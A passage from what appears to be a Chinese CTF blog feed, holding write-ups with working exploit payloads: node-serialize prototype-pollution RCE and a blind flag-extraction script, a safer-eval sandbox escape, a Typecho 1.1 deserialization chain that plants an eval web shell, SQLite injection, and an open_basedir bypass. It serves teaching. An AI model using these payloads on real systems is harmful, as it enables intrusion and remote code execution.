res</span>)</span>&#123;  token = getSanbox(req);  res.end(token);&#125;);app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;  res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;Not Found&#x27;</span>)&#125;);app.use(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) </span>&#123;  <span class="hljs-built_in">console</span>.log(err.stack);  clearEnvir();  res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Some thing broke!&#x27;</span>)&#125;);<span class="hljs-keyword">const</span> server = app.listen(<span class="hljs-number">8082</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">var</span> host = server.address().address;  <span class="hljs-keyword">var</span> port = server.address().port;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)&#125;);</code></pre><p><a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><p>两个点 一个是<code>merge</code>处有原型污染，二是serialize反序列化RCE漏洞在上面那个链接里都有说</p><p>污染到serialize_banner再绕过滤就可以RCE,如这样</p><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;score&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;_$$ND_FUNC$$_a=XXXX&quot;</span>&#125;&#125;&#125;&#125;</code></pre><p>题目限制了score.length&lt;5，这里有个小tricks</p><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;score&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;_$$ND_FUNC$$_a=XXXX&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;length&quot;</span>: <span class="hljs-number">1</span>&#125;&#125;</code></pre><p>然后如何绕过关键字过滤，可以编码绕</p><pre><code class="hljs kotlin">&#123;<span class="hljs-string">&quot;score&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;banner1&quot;</span>: <span class="hljs-string">&quot;_$<span class="hljs-variable">$ND_FUNC</span>$<span class="hljs-variable">$_logs</span>.543e5ea084679bf7d1b7e5becf8fd99a.lastTime=Buffer.constructor(Buffer.from(`72657475726e2070726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428276368696c645f70726f6365737327292e6578656353796e632827636174202f666c616727292e746f537472696e672829`, `he\\x78`).toString())()&quot;</span>&#125;&#125;, <span class="hljs-string">&quot;length&quot;</span>: <span class="hljs-number">1</span>&#125;&#125;<span class="hljs-keyword">return</span> process.mainModule.<span class="hljs-keyword">constructor</span>._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).toString()log后面的一串是类似token的标识</code></pre><p>当初Y老师做出来是靠命令注入</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> jsonurl = <span class="hljs-string">&quot;http://218.197.154.9:10001/record&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen</span>(<span class="hljs-params">c</span>):</span>    p = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;\\x&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;return process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;&#x27;</span>+c+<span class="hljs-string">&#x27;\&#x27;).toString()&#x27;</span>])    r = &#123;<span class="hljs-string">&quot;score&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_``.constructor.constructor(`&quot;</span> + p + <span class="hljs-string">&quot;`)()&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">4</span>&#125;&#125;    <span class="hljs-keyword">return</span> rr = requests.post(url, json=gen(<span class="hljs-string">&#x27;ls&#x27;</span>))print(<span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;broke&#x27;</span> <span class="hljs-keyword">in</span> r.text)di = <span class="hljs-string">&quot;&#123;&#125;_abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>payload = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):  print(<span class="hljs-string">&quot;第&quot;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&quot;轮&quot;</span>)  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> di:    r = requests.post(url, json=gen(<span class="hljs-string">&#x27;grep -e &quot;&#123;&#125;&quot; /flag&#x27;</span>.<span class="hljs-built_in">format</span>(payload+i)))    r = <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;broke&#x27;</span> <span class="hljs-keyword">in</span> r.text    <span class="hljs-keyword">if</span> r:        payload = payload+i        print(payload)        <span class="hljs-keyword">break</span></code></pre><p>函数里包了一个函数，然后就获取不到全局变量了</p><h1 id="BookShop"><a href="#BookShop" class="headerlink" title="BookShop"></a>BookShop</h1><p>不想写了，留一个出题人博客</p><p><a href="https://blog.szfszf.top/article/43/">https://blog.szfszf.top/article/43/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GKCTF2020</title>
    <link href="/2020/05/25/GKCTF2020/"/>
    <url>/2020/05/25/GKCTF2020/</url>
    
    <content type="html"><![CDATA[<h1 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h1><p>绕下disabled_function</p><h1 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h1><p>cve-2020-7066,\0截断</p><pre><code class="hljs awk">?url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.123</span>%<span class="hljs-number">00</span>www.ctfhub.com</code></pre><h1 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h1><ol><li><p>shopxo 模板getshell，然后发现flag在 /root ,但是没有权限</p></li><li><p>auto.sh 是以root执行的，执行了一个py文件，刚好这个文件是可以改的</p></li><li><p> 写入 os.system(“cat /root/flag &gt; /luck.txt”)  flag在luck.txt</p></li></ol><p>#EZ三剑客-EzNode</p><p>给了源码</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> saferEval = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;safer-eval&#x27;</span>); <span class="hljs-comment">// 2019.7/WORKER1 找到一个很棒的库</span><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">const</span> app = express();app.use(bodyParser.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));app.use(bodyParser.json());<span class="hljs-comment">// 2020.1/WORKER2 老板说为了后期方便优化</span>app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;  <span class="hljs-keyword">if</span> (req.path === <span class="hljs-string">&#x27;/eval&#x27;</span>) &#123;    <span class="hljs-keyword">let</span> delay = <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;    <span class="hljs-built_in">console</span>.log(delay);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Number</span>.isInteger(<span class="hljs-built_in">parseInt</span>(req.query.delay))) &#123;      delay = <span class="hljs-built_in">Math</span>.max(delay, <span class="hljs-built_in">parseInt</span>(req.query.delay));    &#125;    <span class="hljs-keyword">const</span> t = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> next(), delay);    <span class="hljs-comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-built_in">clearTimeout</span>(t);      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;timeout&#x27;</span>);      <span class="hljs-keyword">try</span> &#123;        res.send(<span class="hljs-string">&#x27;Timeout!&#x27;</span>);      &#125; <span class="hljs-keyword">catch</span> (e) &#123;      &#125;    &#125;, <span class="hljs-number">1000</span>);  &#125; <span class="hljs-keyword">else</span> &#123;    next();  &#125;&#125;);app.post(<span class="hljs-string">&#x27;/eval&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  <span class="hljs-keyword">let</span> response = <span class="hljs-string">&#x27;&#x27;</span>;  <span class="hljs-keyword">if</span> (req.body.e) &#123;    <span class="hljs-keyword">try</span> &#123;      response = saferEval(req.body.e);    &#125; <span class="hljs-keyword">catch</span> (e) &#123;      response = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;    &#125;  &#125;  res.send(<span class="hljs-built_in">String</span>(response));&#125;);<span class="hljs-comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span>app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./index.js&#x27;</span>));&#125;);<span class="hljs-comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span>app.get(<span class="hljs-string">&#x27;/version&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/json;charset=utf-8&#x27;</span>);  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./package.json&#x27;</span>));&#125;);app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./index.html&#x27;</span>))&#125;)app.listen(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Start listening&#x27;</span>)&#125;);</code></pre><p>先要绕过timeout</p><pre><code class="hljs javascript">app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;  <span class="hljs-keyword">if</span> (req.path === <span class="hljs-string">&#x27;/eval&#x27;</span>) &#123;    <span class="hljs-keyword">let</span> delay = <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;    <span class="hljs-built_in">console</span>.log(delay);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Number</span>.isInteger(<span class="hljs-built_in">parseInt</span>(req.query.delay))) &#123;      delay = <span class="hljs-built_in">Math</span>.max(delay, <span class="hljs-built_in">parseInt</span>(req.query.delay));    &#125;    <span class="hljs-keyword">const</span> t = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> next(), delay);    <span class="hljs-comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-built_in">clearTimeout</span>(t);      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;timeout&#x27;</span>);      <span class="hljs-keyword">try</span> &#123;        res.send(<span class="hljs-string">&#x27;Timeout!&#x27;</span>);      &#125; <span class="hljs-keyword">catch</span> (e) &#123;      &#125;    &#125;, <span class="hljs-number">1000</span>);  &#125; <span class="hljs-keyword">else</span> &#123;    next();  &#125;&#125;);</code></pre><p>Nodejs文档</p><blockquote><p>setTimeout 当 delay ⼤于 2147483647 或⼩于 1 时，则 delay 将会被设置为 1。 ⾮整 数的 delay 会被截断为整数。   </p></blockquote><p>传一个超过2147483647就可以了</p><p>然后就是<code>safer-eval</code>的洞</p><p><a href="https://github.com/advisories/GHSA-v63x-xc9j-hhvq">https://github.com/advisories/GHSA-v63x-xc9j-hhvq</a></p><p><a href="https://github.com/patriksimek/vm2/issues/197">https://github.com/patriksimek/vm2/issues/197</a></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsprint(requests.post(<span class="hljs-string">&#x27;http://7c3dc324-1f52-4616-937d-918a02c57744.node3.buuoj.cn/eval?delay=2147483649&#x27;</span>, data=&#123;    <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;(function () &#123;</span><span class="hljs-string">  const process = clearImmediate.constructor(&quot;return process;&quot;)();</span><span class="hljs-string">  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()</span><span class="hljs-string">&#125;)()&quot;&quot;&quot;</span>    &#125;).text)</code></pre><h1 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h1><p>gopher打redis </p><p>#EZ三剑客-EzTypecho</p><p>题目根据typecho1.1反序列化漏洞改的，把session_start()去掉了，一种做法是上传PHP_SESSION_UPLOAD_PROGRESS造一个session，另外一种是在start还有一个序列化点</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span> = <span class="hljs-string">&#x27;ATOM 1.0&#x27;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_charset</span> = <span class="hljs-string">&#x27;UTF-8&#x27;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_lang</span> = <span class="hljs-string">&#x27;zh&#x27;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$item</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;_items[] = <span class="hljs-variable">$item</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;screenName&#x27;</span>=&gt;<span class="hljs-string">&#x27;file_put_contents(\&#x27;GS.php\&#x27;, \&#x27;&lt;?php @eval($_POST[GS]);?&gt;\&#x27;)&#x27;</span>);    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);&#125;<span class="hljs-variable">$payload1</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<span class="hljs-variable">$payload2</span> = <span class="hljs-keyword">new</span> Typecho_Request();<span class="hljs-variable">$payload1</span>-&gt;addItem(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;author&#x27;</span> =&gt; <span class="hljs-variable">$payload2</span>));<span class="hljs-variable">$exp</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$payload1</span>, <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho&#x27;</span>);<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$exp</span>));<span class="hljs-comment">#payload</span>POST /install.php?start HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">886</span>aa202<span class="hljs-number">-23</span>fd<span class="hljs-number">-4</span>db6-a311<span class="hljs-number">-9</span>a6bb041e22e.node3.buuoj.cnUser-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">76.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">76.0</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><span class="hljs-comment">Content-Length: 0</span><span class="hljs-comment">Origin: http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Referer: http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn/install.php</span><span class="hljs-comment">Cookie: _ga=GA1.2.1586838209.1586328755; __typecho_lang=zh_CN;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdHUy5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW0dTXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==</span><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><span class="hljs-comment"></span><span class="hljs-comment">shell就在GS.php</span></code></pre><p>伪造session_start()解法</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn/install.php?finish=1&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;proxies=&#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;headers=&#123;<span class="hljs-string">&#x27;cookie&#x27;</span>:<span class="hljs-string">&#x27;PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6 IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi 4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhv ciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYX JhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlw ZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicH JlZml4IjtzOjQ6InRlc3QiO30=&#x27;</span>,<span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn/install.php&#x27;</span>&#125;r = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,headers=headers,proxies=proxies)print(r.text)</code></pre><h1 id="Node-Exe"><a href="#Node-Exe" class="headerlink" title="Node-Exe"></a>Node-Exe</h1><p>不会</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>[Zer0pts2020]phpNantokaAdmin</title>
    <link href="/2020/05/20/Zer0pts2020-phpNantokaAdmin/"/>
    <url>/2020/05/20/Zer0pts2020-phpNantokaAdmin/</url>
    
    <content type="html"><![CDATA[<h1 id="bypass-for-sqlite"><a href="#bypass-for-sqlite" class="headerlink" title="bypass for sqlite"></a>bypass for sqlite</h1><p>当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符,如</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;</code></pre><p>只会输出<code>id</code>列</p><p>除去空格，<code>[]</code>和<code>&#39;</code>、<code>&quot;</code>、反引号都可以对列名进行包裹，可以对列进行包裹，达到注入目的</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>先了解一个sqlite创表的语句</p><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sometbl2 <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> <span class="hljs-number">2</span>;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> sometbl2;2</code></pre><p>题目的语句是</p><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`FLAG_TABLE`</span> (<span class="hljs-string">`FLAG_COLUMN`</span> <span class="hljs-built_in">TEXT</span>);</code></pre><p>FLAG_TABLE FLAG_COLUMN都可控，当我们输入这样的东西就会复制别的表，但是<code>*</code>被禁了，只能一列一列复制</p><pre><code class="hljs sql">table_name=neko as <span class="hljs-keyword">select</span> flag_2a2d04c3[&amp;<span class="hljs-keyword">columns</span>[<span class="hljs-number">0</span>][<span class="hljs-keyword">name</span>]=]<span class="hljs-keyword">from</span> flag_bf1811da;&amp;columns[0][type]=INTEGER<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> neko <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> flag_2a2d04c3[ (<span class="hljs-string">`]from flag_bf1811da;`</span> <span class="hljs-built_in">TEXT</span>);</code></pre><p>读下sqlite_master表，就能看到flag的表了</p><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> sqlite_master ( <span class="hljs-keyword">type</span> <span class="hljs-built_in">TEXT</span>, <span class="hljs-keyword">name</span> <span class="hljs-built_in">TEXT</span>, tbl_name <span class="hljs-built_in">TEXT</span>, rootpage <span class="hljs-built_in">INTEGER</span>, <span class="hljs-keyword">sql</span> <span class="hljs-built_in">TEXT</span> ); sql列 ： <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`flag_bf1811da`</span> (<span class="hljs-string">`flag_2a2d04c3`</span> <span class="hljs-built_in">TEXT</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bypass open_basedir</title>
    <link href="/2020/05/19/bypass-open-basedir/"/>
    <url>/2020/05/19/bypass-open-basedir/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;img&#x27;</span>);chdir(<span class="hljs-string">&#x27;img&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">echo</span>(file_get_contents(<span class="hljs-string">&#x27;flag&#x27;</span>));</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass open_basedir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>minilctf</title>
    <link href="/2020/05/15/minilctf/"/>
    <url>/2020/05/15/minilctf/</url>
    
    <content type="html"><![CDATA[<blockquote><p>首发于<a href="https://www.sec-in.com/">https://www.sec-in.com/</a></p><p>Mini LCTF 2020是西电的招新赛，题目比较简单(假的)，但对于本web菜狗来说也学到了很多，要经常提醒自己要多做总结，注意细节 </p></blockquote><h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>打开是源码</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-variable">$id</span>= <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;ID&quot;</span>];show_source(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(unserialize(<span class="hljs-variable">$id</span>) === <span class="hljs-string">&quot;<span class="hljs-subst">$admin</span>&quot;</span>)&#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;next.php&quot;</span>);    <span class="hljs-variable">$key</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/p@d/is&#x27;</span>,<span class="hljs-variable">$key</span>))&#123;        show_source(<span class="hljs-string">&quot;next.php&quot;</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//hint</span><span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;m0ectf&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>第一层直接传<code>ID</code>，考验基本工吧,传参这些的</p><p><img src="https://s1.ax1x.com/2020/05/15/Yr5fdU.png" alt="Yr5fdU.png"></p><p>来到第二层  访问<code>TE9PS0hFUkU=.html</code>,会发现302转跳到百度，抓下包看有什么</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><span class="hljs-comment">T2glMjFHbyUyMCUyMGYxbmExLnBocA==</span><span class="hljs-comment">--&gt;</span>base64后 Oh%21Go%20%20f1na1.php</code></pre><p>第三层 <code>f1na1.php</code>有一个文件读取，但是有过滤，测试大小写可以绕对php的绕过</p><p>伪协议读下源码</p><pre><code class="hljs php"><span class="hljs-comment">#/f1na1.php?file=Php://filter/read=convert.base64-encode/resource=f1na1.Php</span><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[file])&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;./f1na1.php?file=hint.php&quot;&gt;See hint.&lt;/a&gt;&#x27;</span>;&#125;<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||stristr(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>)||strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;php&quot;</span>))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!&quot;</span>;<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <span class="hljs-meta">?&gt;</span><span class="hljs-comment"># hint.php</span>&lt;p&gt;Flag is here.&lt;/p&gt;</code></pre><p>f1na1.php中<code>stristr</code>不分大小写，<code>strstr</code>区分大小写，所以大小写可以绕php，但是绕不过其他的</p><p>hint.php 中可以提示有flag在这个目录中，但是文件名不知道，目标就是扫目录了</p><p>引入一个知识点    </p><p>RFI 绕过 URL 包含限制 